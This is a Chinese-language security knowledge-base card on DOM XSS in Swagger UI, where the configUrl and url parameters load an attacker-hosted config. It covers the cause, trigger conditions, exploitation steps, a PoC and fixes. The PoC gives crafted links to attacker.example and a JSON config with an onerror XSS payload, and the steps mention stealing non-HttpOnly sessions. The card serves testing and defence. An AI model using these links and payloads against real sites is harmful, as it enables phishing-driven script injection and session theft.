---
id: web-generic-xss-swagger-ui-configurl-dom-xss
title: Swagger UI configUrl/url 参数加载外部配置导致 DOM XSS
type: scenario
domain: web
path: web/generic/xss
technique: swagger-ui-configurl-dom-xss
tags:
- web
- xss
- dom-xss
- swagger
- openapi
- config-url
- csp
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:33:09+08:00'
  notes: 已对照原文与图35核对：/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json 触发脚本弹窗，证明该实例可加载外部配置并执行 DOM XSS；原文未标版本、未证明会话窃取，confidence=medium 与卡中边界一致。原文未涉及版本区间。PoC 未在本机执行。
url: /docs/web/generic/xss/web-generic-xss-swagger-ui-configurl-dom-xss/
draft: false
kb_aliases:
- Swagger UI DOM XSS
- configUrl XSS
- Swagger url 参数 XSS
- OpenAPI 文档 XSS
- swagger-ui.html 反射
---

## 一句话结论

Swagger UI 的 `configUrl`/`url` 查询参数用于从外部加载 OpenAPI 配置；在未严格限制来源、未对配置内容做安全处理的版本中，攻击者可让受害者打开指向恶意配置的 Swagger UI 链接，在目标站点源下执行 DOM XSS。

## 原理

- Swagger UI 支持通过 URL 参数指定配置来源：`?url=<spec>` 加载 OpenAPI 规范，`?configUrl=<json>` 加载 Swagger UI 配置（配置中还能再指定 `urls`/`url`）。
- 浏览器会按参数去请求攻击者指定的地址；若 Swagger UI 版本较旧或配置不当，加载到的规范/配置中的字段（如 `description`、`info`、`urls` 条目）会被当作 HTML 插入 DOM，而不是纯文本转义，从而触发 DOM XSS。
- 攻击者可以托管一个恶意 JSON/YAML 规范，或使用 `data:` URI 内联配置；受害者访问构造好的 `swagger-ui.html?configUrl=...` 链接后，脚本在目标站点源下执行。
- 该漏洞依赖具体 Swagger UI 版本与参数处理逻辑；较新版本默认对内容做转义、限制外部 URL 或要求同源，利用会失败。CSP 也会阻断内联脚本或外部脚本。
- 这类 XSS 属于 DOM XSS，通常不经过服务端反射，WAF/服务端日志难以发现；但钓鱼链接需要诱导受害者点击。

## 触发条件

- 目标暴露 Swagger UI 页面，且版本/配置允许通过 `configUrl` 或 `url` 加载外部配置。
- 页面未对外部配置来源做严格白名单，或允许 `data:` URI。
- 加载的配置字段被不安全的 DOM API（如 `innerHTML`）渲染，未做 HTML 编码。
- 目标页面没有严格 CSP 阻断脚本执行。

## 利用步骤

1. 确认目标 Swagger UI 可访问及版本：访问 `/swagger-ui.html`、`/swagger-ui/index.html`，查看静态资源版本号。
2. 准备恶意 OpenAPI JSON/YAML 或 Swagger UI 配置，在可被受害者访问的地址托管。
3. 构造链接：`/swagger-ui.html?configUrl=<恶意配置地址>` 或 `?url=<恶意规范地址>`；也可尝试 `data:` URI。
4. 诱导受害者（管理员/开发者）打开链接，观察是否执行脚本（可用 `console.log`/带外请求验证）。
5. 验证危害：读取同源页面数据、以受害者身份发起请求、窃取非 HttpOnly 会话等（授权范围内）。

## PoC

```text
# 恶意配置托管在攻击者可控地址后，构造：
https://target.example/swagger-ui.html?configUrl=https://attacker.example/test.json

# 或直接加载恶意 OpenAPI 规范：
https://target.example/swagger-ui.html?url=https://attacker.example/test.yaml

# 也可尝试 data: URI 内联配置（是否可用取决于版本/浏览器）：
https://target.example/swagger-ui.html?configUrl=data:text/html;base64,<BASE64_CONFIG>
```

```json
{
  "urls": [
    {
      "url": "https://attacker.example/test.yaml",
      "name": "<img src=x onerror=console.log(1)>"
    }
  ]
}
```

```text
# 验证：打开链接后 Console 输出 1，或攻击者服务器收到带外请求。
```

## 变体与关联

- 变体：`url` 参数直接加载恶意 OpenAPI 规范；规范的 `description`/`info` 字段可能成为注入点。
- 变体：`configUrl` 指向的配置可再次指定 `urls`，形成二级加载。
- 变体：结合开放重定向/短链隐藏恶意地址，提高钓鱼成功率。
- 关联：[[web-generic-xss-filter-bypass-encoding-obfuscation]]、[[web-generic-xss-scriptless-execution-vectors]]（载荷构造）；[[web-generic-auth-swagger-unauth-user-management]]（同一 Swagger 暴露面的未授权接口问题）。
- 边界：较新 Swagger UI、严格 CSP、外部 URL 白名单或同源限制会使利用失败；案例仅验证了弹窗/脚本执行，未证明会话窃取。edu SRC 通常不收 DOM XSS，但众测/企业 SRC 可作为有效漏洞。

## 检测与防御

- 检测：扫描 `swagger-ui.html?configUrl=`/`?url=` 参数；审计 Swagger UI 版本与外部配置加载逻辑；监控页面加载异常外部 JSON/YAML；CSP 报告可作为线索。
- 修复：升级 Swagger UI 到修复版本；生产环境关闭 Swagger UI 或加认证；禁止 `configUrl`/`url` 加载外部来源，使用同源白名单。
- 加固：设置严格 CSP（禁止 `unsafe-inline` 与不必要的外部脚本）；对规范字段做 HTML 编码；把 Swagger UI 部署在独立域名/内网。
